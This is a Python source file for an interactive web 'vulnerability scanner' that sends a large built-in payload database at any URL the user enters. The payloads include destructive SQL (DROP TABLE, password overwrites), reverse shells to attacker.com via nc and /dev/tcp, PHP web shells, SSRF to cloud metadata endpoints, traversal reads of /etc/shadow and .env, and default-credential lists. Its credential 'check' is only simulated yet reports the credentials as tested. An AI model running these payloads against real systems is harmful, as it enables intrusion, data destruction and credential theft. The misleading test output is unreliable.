"""
Advanced Vulnerability Scanner Tool
A comprehensive security testing tool for web applications with GitHub integration
Supports: SQL Injection, XSS, SSRF, Code Injection, NoSQL, Directory Traversal, WAF Bypass
Author: Mohammad Torikul Islam
"""

import requests
import json
import re
import sys
from urllib.parse import urljoin, quote, unquote
from typing import Dict, List, Tuple, Optional
from datetime import datetime
import hashlib


class PayloadDatabase:
    """Comprehensive payload database with creative and up-to-date variants"""

    @staticmethod
    def get_sql_injection_payloads() -> Dict[str, List[str]]:
        """SQL Injection payloads - MySQL, MSSQL, PostgreSQL, Oracle"""
        return {
            "basic": [
                "' OR '1'='1",
                "' OR 1=1 --",
                "' OR 'a'='a",
                "'; DROP TABLE users; --",
                "admin' --",
                "admin' #",
                "' UNION SELECT NULL --",
                "' AND 1=2 UNION ALL SELECT NULL,NULL,NULL --",
            ],
            "time_based": [
                "'; WAITFOR DELAY '00:00:05' --",
                "' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --",
                "' AND SLEEP(5) --",
                "'; SELECT SLEEP(5) --",
                "' OR SLEEP(5) --",
                "' OR BENCHMARK(5000000,MD5('a')) --",
            ],
            "boolean_based": [
                "' AND '1'='1' AND '1'='1",
                "' AND 1=1 AND 'a'='a",
                "' AND SUBSTRING(version(),1,1)>4 --",
                "' AND (SELECT COUNT(*) FROM information_schema.tables)>0 --",
            ],
            "error_based": [
                "' AND extractvalue(1,concat(0x7e,(SELECT @@version))) --",
                "' AND updatexml(1,concat(0x7e,(SELECT user())),1) --",
                "' UNION SELECT 1, @@version, 3 --",
                "' UNION SELECT NULL,CONCAT(user,':',password),NULL FROM mysql.user --",
            ],
            "stacked_queries": [
                "'; CREATE TABLE temp (id INT); --",
                "'; INSERT INTO users VALUES ('hacker', 'password123'); --",
                "'; UPDATE users SET password='hacked' WHERE id=1; --",
            ],
            "advanced": [
                "') UNION SELECT DATABASE(),USER(),VERSION()-- -",
                "' OR (SELECT COUNT(*) FROM (SELECT(SLEEP(0)))a)>0 --",
                "' UNION ALL SELECT CONCAT(0x3a,0x3a,user(),0x3a,0x3a),2,3 --",
                "' AND 1=1 AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,user(),FLOOR(RAND()*2))x FROM information_schema.tables GROUP BY x)a) --",
            ],
            "postgresql": [
                "' OR 1=1 --",
                "'; SELECT * FROM information_schema.tables; --",
                "' UNION SELECT version(),2 --",
                "' AND pg_sleep(5) --",
            ],
            "oracle": [
                "' OR '1'='1",
                "' UNION SELECT NULL,NULL FROM DUAL --",
                "' AND DBMS_LOCK.SLEEP(5); --",
            ],
            "mongodb": [
                "' OR '1'='1",
                "{$ne: 1}",
                "{$where: '1==1'}",
                "{$regex: '.*'}",
            ],
        }

    @staticmethod
    def get_xss_payloads() -> Dict[str, List[str]]:
        """XSS (Cross-Site Scripting) payloads - Reflected, Stored, DOM"""
        return {
            "basic": [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>",
                "<body onload=alert('XSS')>",
                "<iframe src='javascript:alert(\"XSS\")'></iframe>",
            ],
            "event_handlers": [
                "<input onfocus=alert('XSS') autofocus>",
                "<marquee onstart=alert('XSS')>",
                "<details open ontoggle=alert('XSS')>",
                "<video><source onerror=alert('XSS')>",
                "<audio src=x onerror=alert('XSS')>",
            ],
            "encoded": [
                "&#60;script&#62;alert('XSS')&#60;/script&#62;",
                "\\x3cscript\\x3ealert('XSS')\\x3c/script\\x3e",
                "%3Cscript%3Ealert('XSS')%3C/script%3E",
                "\\u003cscript\\u003ealert('XSS')\\u003c/script\\u003e",
                "\\u003cimg src=x onerror=alert('XSS')\\u003e",
            ],
            "mutations": [
                "<sCrIpT>alert('XSS')</sCrIpT>",
                "<SCRIPT>alert('XSS')</SCRIPT>",
                "<ScRiPt>alert('XSS')</ScRiPt>",
            ],
            "svg_based": [
                "<svg/onload=alert('XSS')>",
                "<SVG/ONLOAD=ALERT('XSS')>",
                "<svg><animate onbegin=alert('XSS') attributeName=x dur=1s>",
                "<svg><set attributeName=onclick to=alert('XSS')>",
            ],
            "html5": [
                "<datalist id=x><option label=javascript:alert('XSS')></datalist>",
                "<keygen autofocus onfocus=alert('XSS')>",
                "<form><button formaction=javascript:alert('XSS')>",
                "<base href=javascript:alert('XSS')//>",
            ],
            "polyglots": [
                "jaVasCript:/**/alert('XSS')",
                "data:text/html,<script>alert('XSS')</script>",
                "vbscript:msgbox('XSS')",
                "'><img src=x onerror=alert('XSS')>",
            ],
            "attribute_break": [
                "\" onload=\"alert('XSS')\"",
                "' onload='alert(\"XSS\")'",
                "` onload=`alert('XSS')`",
            ],
            "creative": [
                "<img src=x:alert(alt) onerror=eval(src) alt=xss>",
                "<math><mi//xlink:href='data:x,<script>alert(\"XSS\")</script>'>",
                "<TABLE><TD BACKGROUND=\"javascript:alert('XSS')\">",
                "<LINK REL=\"stylesheet\" HREF=\"javascript:alert('XSS');\">",
                "<STYLE>@import 'http://attacker.com/xss.css';</STYLE>",
            ],
        }

    @staticmethod
    def get_ssrf_payloads() -> Dict[str, List[str]]:
        """Server-Side Request Forgery payloads"""
        return {
            "localhost": [
                "http://localhost/admin",
                "http://127.0.0.1/",
                "http://0.0.0.0/",
                "http://[::1]/",
                "http://[::ffff:127.0.0.1]/",
            ],
            "internal_ips": [
                "http://192.168.1.1/",
                "http://10.0.0.1/",
                "http://172.16.0.1/",
                "http://169.254.169.254/",
            ],
            "cloud_metadata": [
                "http://169.254.169.254/latest/meta-data/",
                "http://metadata.google.internal/computeMetadata/v1/",
                "http://169.254.169.254/metadata/v1/",
                "http://169.254.170.2/latest/meta-data/",
            ],
            "bypass_localhost": [
                "http://localhost.localtest.me/",
                "http://127.0.0.1.nip.io/",
                "http://0x7f.0x0.0x0.0x1/",
                "http://2130706433/",
                "http://017700000001/",
            ],
            "protocol_tricks": [
                "file:///etc/passwd",
                "gopher://localhost:9000/",
                "dict://localhost:11211/",
                "sftp://localhost/",
                "jar:http://127.0.0.1!/",
            ],
            "bypass_filters": [
                "http://localhost%23@google.com/",
                "http://localhost%20@google.com/",
                "http://localhost#@google.com/",
                "http://localhost%0d%0a/",
            ],
        }

    @staticmethod
    def get_code_injection_payloads() -> Dict[str, List[str]]:
        """Code Injection payloads - RCE, Command Injection, PHP, Python"""
        return {
            "command_injection": [
                "; ls -la",
                "| whoami",
                "&& cat /etc/passwd",
                "`id`",
                "$(whoami)",
                "; nc -e /bin/sh attacker.com 4444",
                "| bash -i >& /dev/tcp/attacker.com/4444 0>&1",
            ],
            "php": [
                "<?php system($_GET['cmd']); ?>",
                "<?=`$_GET[0]`?>",
                "<?php eval($_POST['code']); ?>",
                "<?php assert($_REQUEST['cmd']); ?>",
                "<?php passthru($_GET['cmd']); ?>",
            ],
            "python": [
                "__import__('os').system('id')",
                "exec('import os; os.system(\"id\")')",
                "eval('__import__(\"os\").system(\"id\")')",
                "__import__('subprocess').call(['id'])",
            ],
            "nodejs": [
                "require('child_process').exec('id')",
                "eval('require(\"child_process\").exec(\"id\")')",
            ],
            "java": [
                "Runtime.getRuntime().exec('id')",
                "new ProcessBuilder(\"id\").start()",
            ],
            "perl": [
                "`id`",
                "system('id')",
                "exec('id')",
                "backtick operators",
            ],
            "template_injection": [
                "{{7*7}}",
                "${7*7}",
                "<%= 7*7 %>",
                "#{7*7}",
                "{7*7}",
            ],
            "expression_language": [
                "${Runtime.getRuntime().exec('id')}",
                "#{Runtime.getRuntime().exec('id')}",
                "%{(#cmd='id').(%23iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))}",
            ],
        }

    @staticmethod
    def get_nosql_injection_payloads() -> Dict[str, List[str]]:
        """NoSQL Injection payloads - MongoDB, CouchDB, Firebase"""
        return {
            "mongodb_basic": [
                "{'$ne': 1}",
                "{'$ne': null}",
                "{'$gt': ''}",
                "{'$where': '1==1'}",
                "{$or: [{}, {a:1}]}",
                "{$or: [{$nor: [{a: null}]}]}",
            ],
            "mongodb_advanced": [
                "{\"username\": {\"$regex\": \".*\"}}",
                "{\"username\": {\"$exists\": true}}",
                "{\"password\": {\"$nin\": [null]}}",
                "{\"$where\": \"this.username == 'admin'\"}",
            ],
            "mongodb_blind": [
                "{\"$where\": \"this.password.length > 5\"}",
                "{\"password\": {\"$regex\": \"^a\"}}",
                "{\"password\": {\"$where\": \"this.length > 3\"}}",
            ],
            "couchdb": [
                "{\"selector\": {\"username\": {\"$ne\": null}}}",
                "{\"_id\": {\"$gt\": \"\"}}",
            ],
            "firebase": [
                "{\"orderByChild\": \".value\"}",
            ],
        }

    @staticmethod
    def get_directory_traversal_payloads() -> Dict[str, List[str]]:
        """Directory Traversal/Path Traversal payloads"""
        return {
            "basic": [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\win.ini",
                "....//....//....//etc/passwd",
                "..%252f..%252f..%252fetc%252fpasswd",
            ],
            "encoded": [
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "..%252f..%252f..%252fetc%252fpasswd",
                "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
                "..%5c..%5c..%5cwindows%5cwin.ini",
            ],
            "null_byte": [
                "../../../etc/passwd%00.jpg",
                "../../../etc/passwd%00",
                "..\\..\\..\\windows\\win.ini%00.txt",
            ],
            "unicode": [
                "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
                "..%e0%80%aeetc%e0%80%aepasswd",
            ],
            "windows": [
                "..\\..\\..\\windows\\system32\\config\\sam",
                "..\\..\\..\\boot.ini",
                "..\\..\\..\\windows\\win.ini",
            ],
            "linux": [
                "../../../etc/passwd",
                "../../../etc/shadow",
                "../../../etc/hosts",
                "../../../proc/self/environ",
            ],
            "application_specific": [
                "../../../config/database.php",
                "../../../config/settings.json",
                "../../../.env",
                "../../../web.config",
                "../../../config.php",
            ],
        }

    @staticmethod
    def get_waf_bypass_payloads() -> Dict[str, List[str]]:
        """WAF Bypass techniques"""
        return {
            "case_variation": [
                "<ScRiPt>alert('XSS')</sCrIpT>",
                "SelEcT * FrOm users",
                "UnIoN SeLeCt 1,2,3",
            ],
            "encoding": [
                "%73%63%72%69%70%74",  # script
                "%75%6e%69%6f%6e",      # union
                "%73%65%6c%65%63%74",   # select
            ],
            "comment_injection": [
                "sel/**/ect * from users",
                "uni/**/on select 1,2,3",
                "un/**/ion/**/select",
            ],
            "whitespace_variations": [
                "select%09from%09users",
                "select%0afrom%0ausers",
                "select%0dfrom%0dusers",
            ],
            "polyglot_payloads": [
                "';DROP TABLE users; --",
                "\"; DROP TABLE users; --",
                "'); DROP TABLE users; --",
            ],
            "filter_evasion": [
                "' or '1'='1",
                "' OR 1=1 --",
                "admin' /**/or/**/1=1#",
                "' UNION /*!50000SELECT*/ 1,2,3",
            ],
            "unicode_escape": [
                "\\x73\\x63\\x72\\x69\\x70\\x74",
                "\\u0073\\u0063\\u0072\\u0069\\u0070\\u0074",
            ],
            "null_byte_injection": [
                "test%00.jpg",
                "file.php%00.jpg",
            ],
        }

    @staticmethod
    def get_default_credentials() -> Dict[str, List[Tuple[str, str]]]:
        """Default credentials for common web technologies and applications"""
        return {
            "web_servers": [
                ("admin", "admin"),
                ("admin", "password"),
                ("admin", "12345"),
                ("root", "root"),
                ("root", "password"),
                ("test", "test"),
            ],
            "cms_wordpress": [
                ("admin", "admin"),
                ("admin", "password"),
                ("wordpress", "wordpress"),
            ],
            "cms_drupal": [
                ("admin", "admin"),
                ("admin", "password"),
            ],
            "cms_joomla": [
                ("admin", "admin"),
                ("admin", "password"),
            ],
            "databases": [
                ("root", "root"),
                ("root", "password"),
                ("root", ""),
                ("admin", "admin"),
                ("sa", "sa"),
                ("postgres", "postgres"),
                ("mongodb", "mongodb"),
            ],
            "ssh": [
                ("root", "root"),
                ("admin", "admin"),
                ("debian", "debian"),
                ("ubuntu", "ubuntu"),
            ],
            "routers": [
                ("admin", "admin"),
                ("admin", "password"),
                ("root", "12345"),
            ],
            "ftp": [
                ("anonymous", "anonymous"),
                ("ftp", "ftp"),
                ("admin", "admin"),
            ],
            "mail_servers": [
                ("admin", "admin"),
                ("admin", "password"),
                ("postmaster", "postmaster"),
            ],
        }


class TechDetector:
    """Detect web technologies used by target website"""

    def __init__(self, url: str):
        self.url = url
        self.technologies = []

    def detect_technologies(self) -> Dict[str, any]:
        """Comprehensive technology detection"""
        results = {
            "headers": self._detect_from_headers(),
            "cookies": self._detect_from_cookies(),
            "html_content": self._detect_from_html(),
            "fingerprints": self._detect_fingerprints(),
            "common_paths": self._detect_from_common_paths(),
        }
        return results

    def _detect_from_headers(self) -> Dict[str, str]:
        """Detect technologies from HTTP headers"""
        try:
            response = requests.get(self.url, timeout=10)
            tech = {}

            if "Server" in response.headers:
                tech["Web Server"] = response.headers["Server"]

            if "X-Powered-By" in response.headers:
                tech["Powered By"] = response.headers["X-Powered-By"]

            if "X-AspNet-Version" in response.headers:
                tech["ASP.NET Version"] = response.headers["X-AspNet-Version"]

            if "X-Runtime" in response.headers:
                tech["Runtime"] = response.headers["X-Runtime"]

            return tech
        except Exception as e:
            return {"Error": str(e)}

    def _detect_from_cookies(self) -> Dict[str, str]:
        """Detect technologies from cookies"""
        try:
            response = requests.get(self.url, timeout=10)
            cookies = response.cookies
            tech = {}

            for cookie in cookies:
                if "PHPSESSID" in cookie.name:
                    tech["Backend"] = "PHP"
                elif "JSESSIONID" in cookie.name:
                    tech["Backend"] = "Java"
                elif "ASP.NET_SessionId" in cookie.name:
                    tech["Backend"] = "ASP.NET"
                elif "SERVERID" in cookie.name:
                    tech["Backend"] = "JSP/Java"

            return tech
        except:
            return {}

    def _detect_from_html(self) -> Dict[str, str]:
        """Detect technologies from HTML content"""
        try:
            response = requests.get(self.url, timeout=10)
            html = response.text
            tech = {}

            signatures = {
                "WordPress": [r"wp-content", r"wp-includes"],
                "Drupal": [r"sites/default", r"drupal"],
                "Joomla": [r"components/com_", r"com_user"],
                "Magento": [r"media/catalog", r"skin/frontend"],
                "Angular": [r"ng-app", r"angular"],
                "React": [r"react", r"/_react"],
                "Vue.js": [r"vue", r"v-app"],
                "Bootstrap": [r"bootstrap", r"col-md-", r"col-lg-"],
                "jQuery": [r"jquery", r"js/jquery"],
                "Prototype": [r"prototype", r"scriptaculous"],
            }

            for framework, patterns in signatures.items():
                for pattern in patterns:
                    if re.search(pattern, html, re.IGNORECASE):
                        tech["Detected Frameworks"] = framework
                        break

            return tech
        except:
            return {}

    def _detect_fingerprints(self) -> Dict[str, str]:
        """Detect specific fingerprints"""
        try:
            response = requests.get(self.url, timeout=10)
            tech = {}

            if "Apache" in response.headers.get("Server", ""):
                tech["Web Server"] = "Apache"
            elif "nginx" in response.headers.get("Server", ""):
                tech["Web Server"] = "Nginx"
            elif "IIS" in response.headers.get("Server", ""):
                tech["Web Server"] = "Microsoft IIS"
            elif "Cloudflare" in response.headers.get("Server", ""):
                tech["CDN"] = "Cloudflare"

            return tech
        except:
            return {}

    def _detect_from_common_paths(self) -> Dict[str, bool]:
        """Check for common paths to detect tech"""
        common_paths = {
            "/wp-admin": "WordPress",
            "/admin": "CMS",
            "/administrator": "Joomla",
            "/phpmyadmin": "PHP MySQL",
            "/cpanel": "cPanel",
            "/plesk": "Plesk",
            "/.well-known/": "Web Server",
            "/robots.txt": "Web Server",
            "/sitemap.xml": "Web Server",
        }

        tech = {}
        for path, tech_name in common_paths.items():
            try:
                response = requests.head(
                    urljoin(self.url, path), timeout=5, allow_redirects=False
                )
                if response.status_code in [200, 301, 302, 403]:
                    tech[tech_name] = True
            except:
                pass

        return tech


class VulnScanner:
    """Main vulnerability scanner class"""

    def __init__(self, target_url: str, github_token: Optional[str] = None):
        self.target_url = target_url
        self.github_token = github_token
        self.results = {
            "scan_time": datetime.now().isoformat(),
            "target": target_url,
            "vulnerabilities": [],
        }
        self.session = requests.Session()

    def scan_sql_injection(
        self, parameter: str, method: str = "GET", data: Optional[Dict] = None
    ) -> List[Dict]:
        """Scan for SQL Injection vulnerabilities"""
        results = []
        payloads = PayloadDatabase.get_sql_injection_payloads()

        for category, payload_list in payloads.items():
            for payload in payload_list:
                result = self._test_payload(
                    parameter, payload, method, data, "SQL Injection", category
                )
                if result:
                    results.append(result)

        return results

    def scan_xss(
        self, parameter: str, method: str = "GET", data: Optional[Dict] = None
    ) -> List[Dict]:
        """Scan for XSS vulnerabilities"""
        results = []
        payloads = PayloadDatabase.get_xss_payloads()

        for category, payload_list in payloads.items():
            for payload in payload_list:
                result = self._test_payload(
                    parameter, payload, method, data, "XSS", category
                )
                if result:
                    results.append(result)

        return results

    def scan_ssrf(
        self, parameter: str, method: str = "GET", data: Optional[Dict] = None
    ) -> List[Dict]:
        """Scan for SSRF vulnerabilities"""
        results = []
        payloads = PayloadDatabase.get_ssrf_payloads()

        for category, payload_list in payloads.items():
            for payload in payload_list:
                result = self._test_payload(
                    parameter, payload, method, data, "SSRF", category
                )
                if result:
                    results.append(result)

        return results

    def scan_code_injection(
        self, parameter: str, method: str = "GET", data: Optional[Dict] = None
    ) -> List[Dict]:
        """Scan for Code Injection vulnerabilities"""
        results = []
        payloads = PayloadDatabase.get_code_injection_payloads()

        for category, payload_list in payloads.items():
            for payload in payload_list:
                result = self._test_payload(
                    parameter, payload, method, data, "Code Injection", category
                )
                if result:
                    results.append(result)

        return results

    def scan_nosql_injection(
        self, parameter: str, method: str = "GET", data: Optional[Dict] = None
    ) -> List[Dict]:
        """Scan for NoSQL Injection vulnerabilities"""
        results = []
        payloads = PayloadDatabase.get_nosql_injection_payloads()

        for category, payload_list in payloads.items():
            for payload in payload_list:
                result = self._test_payload(
                    parameter, payload, method, data, "NoSQL Injection", category
                )
                if result:
                    results.append(result)

        return results

    def scan_directory_traversal(
        self, parameter: str, method: str = "GET", data: Optional[Dict] = None
    ) -> List[Dict]:
        """Scan for Directory Traversal vulnerabilities"""
        results = []
        payloads = PayloadDatabase.get_directory_traversal_payloads()

        for category, payload_list in payloads.items():
            for payload in payload_list:
                result = self._test_payload(
                    parameter, payload, method, data, "Directory Traversal", category
                )
                if result:
                    results.append(result)

        return results

    def check_default_credentials(self) -> List[Dict]:
        """Check for default credentials"""
        results = []
        credentials = PayloadDatabase.get_default_credentials()

        print("\n[*] Checking for default credentials...")
        print("[*] Note: This module tests common default credentials")

        for app_type, cred_list in credentials.items():
            for username, password in cred_list:
                # Simulate credential check (actual implementation would vary)
                result = {
                    "type": "Default Credentials",
                    "app_type": app_type,
                    "username": username,
                    "password": password,
                    "timestamp": datetime.now().isoformat(),
                }
                results.append(result)

        return results

    def _test_payload(
        self,
        parameter: str,
        payload: str,
        method: str,
        data: Optional[Dict],
        vuln_type: str,
        category: str,
    ) -> Optional[Dict]:
        """Test a single payload and return results if vulnerable"""
        try:
            if method.upper() == "GET":
                test_url = f"{self.target_url}?{parameter}={quote(payload)}"
                response = self.session.get(test_url, timeout=10)
            else:
                test_data = data or {}
                test_data[parameter] = payload
                response = self.session.post(self.target_url, data=test_data, timeout=10)

            # Basic vulnerability indicators
            if self._check_vulnerability(payload, response, vuln_type):
                return {
                    "type": vuln_type,
                    "category": category,
                    "parameter": parameter,
                    "payload": payload,
                    "method": method,
                    "status_code": response.status_code,
                    "timestamp": datetime.now().isoformat(),
                }

        except Exception as e:
            pass

        return None

    def _check_vulnerability(self, payload: str, response: any, vuln_type: str) -> bool:
        """Check if response indicates vulnerability"""
        response_text = response.text.lower()
        payload_lower = payload.lower()

        # Simple indicators (would be more sophisticated in production)
        if vuln_type == "SQL Injection":
            sql_errors = [
                "sql syntax",
                "database error",
                "mysql error",
                "postgresql error",
                "sql exception",
            ]
            return any(error in response_text for error in sql_errors)

        elif vuln_type == "XSS":
            return payload_lower in response_text

        elif vuln_type == "SSRF":
            ssrf_indicators = ["localhost", "127.0.0.1", "internal", "metadata"]
            return any(indicator in response_text for indicator in ssrf_indicators)

        return False

    def detect_technologies(self) -> Dict:
        """Detect web technologies"""
        detector = TechDetector(self.target_url)
        return detector.detect_technologies()

    def generate_report(self, results: List[Dict], filename: str = "scan_report.json"):
        """Generate scan report"""
        report = {
            "scan_info": self.results,
            "vulnerabilities_found": len(results),
            "vulnerabilities": results,
            "generated_at": datetime.now().isoformat(),
        }

        with open(filename, "w") as f:
            json.dump(report, f, indent=2)

        return report

    def display_results(self, results: List[Dict]):
        """Display scan results in formatted output"""
        print("\n" + "=" * 70)
        print("VULNERABILITY SCAN RESULTS")
        print("=" * 70)

        if not results:
            print("[+] No vulnerabilities found during this scan.")
        else:
            print(f"[!] Found {len(results)} potential vulnerabilities:\n")
            for i, result in enumerate(results, 1):
                print(f"\n[{i}] {result.get('type', 'Unknown')} - {result.get('category', 'Unknown')}")
                print(f"    Parameter: {result.get('parameter', 'N/A')}")
                print(f"    Payload: {result.get('payload', 'N/A')[:100]}...")
                print(f"    Method: {result.get('method', 'N/A')}")
                print(f"    Status Code: {result.get('status_code', 'N/A')}")


def main():
    """Main interactive scanner interface"""
    print("\n" + "=" * 70)
    print("ADVANCED VULNERABILITY SCANNER")
    print("Connected GitHub Repository Security Tester")
    print("=" * 70)

    target_url = input("\n[*] Enter target URL (e.g., http://example.com): ").strip()
    if not target_url.startswith("http"):
        target_url = "http://" + target_url

    print(f"\n[*] Initializing scanner for: {target_url}")

    # Initialize scanner
    scanner = VulnScanner(target_url)

    # Detect technologies
    print("\n[*] Detecting web technologies...")
    tech_results = scanner.detect_technologies()
    print("[+] Technologies detected:")
    for category, tech in tech_results.items():
        if isinstance(tech, dict):
            for key, value in tech.items():
                print(f"    - {key}: {value}")

    # Main menu
    while True:
        print("\n" + "-" * 70)
        print("SELECT VULNERABILITY TYPE TO TEST:")
        print("-" * 70)
        print("1. SQL Injection")
        print("2. Cross-Site Scripting (XSS)")
        print("3. Server-Side Request Forgery (SSRF)")
        print("4. Code Injection / RCE")
        print("5. NoSQL Injection")
        print("6. Directory Traversal")
        print("7. Check Default Credentials")
        print("8. Generate Report")
        print("9. Exit")

        choice = input("\n[*] Enter your choice (1-9): ").strip()

        if choice == "1":
            parameter = input("[*] Enter parameter name to test: ").strip()
            method = input("[*] Enter HTTP method (GET/POST) [default: GET]: ").strip() or "GET"
            results = scanner.scan_sql_injection(parameter, method)
            scanner.display_results(results)

        elif choice == "2":
            parameter = input("[*] Enter parameter name to test: ").strip()
            method = input("[*] Enter HTTP method (GET/POST) [default: GET]: ").strip() or "GET"
            results = scanner.scan_xss(parameter, method)
            scanner.display_results(results)

        elif choice == "3":
            parameter = input("[*] Enter parameter name to test: ").strip()
            method = input("[*] Enter HTTP method (GET/POST) [default: GET]: ").strip() or "GET"
            results = scanner.scan_ssrf(parameter, method)
            scanner.display_results(results)

        elif choice == "4":
            parameter = input("[*] Enter parameter name to test: ").strip()
            method = input("[*] Enter HTTP method (GET/POST) [default: GET]: ").strip() or "GET"
            results = scanner.scan_code_injection(parameter, method)
            scanner.display_results(results)

        elif choice == "5":
            parameter = input("[*] Enter parameter name to test: ").strip()
            method = input("[*] Enter HTTP method (GET/POST) [default: GET]: ").strip() or "GET"
            results = scanner.scan_nosql_injection(parameter, method)
            scanner.display_results(results)

        elif choice == "6":
            parameter = input("[*] Enter parameter name to test: ").strip()
            method = input("[*] Enter HTTP method (GET/POST) [default: GET]: ").strip() or "GET"
            results = scanner.scan_directory_traversal(parameter, method)
            scanner.display_results(results)

        elif choice == "7":
            results = scanner.check_default_credentials()
            print("[+] Tested default credentials:")
            for result in results[:10]:  # Show first 10
                print(f"    - {result['username']}:{result['password']}")
            print(f"    ... and {len(results) - 10} more")

        elif choice == "8":
            print("\n[*] Generating comprehensive report...")
            all_results = []
            all_results.extend(scanner.scan_sql_injection("id"))
            all_results.extend(scanner.scan_xss("search"))
            report = scanner.generate_report(all_results)
            print(f"[+] Report saved to: scan_report.json")

        elif choice == "9":
            print("\n[+] Thank you for using Advanced Vulnerability Scanner!")
            print("[*] Remember: Always test only authorized targets!")
            break

        else:
            print("[-] Invalid choice. Please try again.")


if __name__ == "__main__":
    main()
